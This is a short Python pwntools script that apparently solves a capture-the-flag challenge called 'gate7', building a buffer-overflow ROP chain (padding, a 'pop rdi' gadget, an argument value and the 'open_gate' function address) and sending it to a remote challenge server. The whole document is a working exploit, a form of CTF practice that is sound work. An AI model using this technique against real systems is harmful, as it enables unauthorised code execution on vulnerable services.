from pwn import *

elf = context.binary = ELF('./gate7')
rop = ROP(elf)
# p = process()
p = remote('gate7.wolvctf-2026.kctf.cloud', 1337)

rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
open_gate = elf.sym['open_gate']

# payload = flat( 'A'*56, ret, rdi, 0xc0ffee, open_gate )
payload = flat('A'*56, rdi, 0xc0ffee, open_gate+1)

p.sendlineafter('Gate 7 keypad. Enter access code:\n', payload.ljust(0x80, b'\x00'))
p.interactive()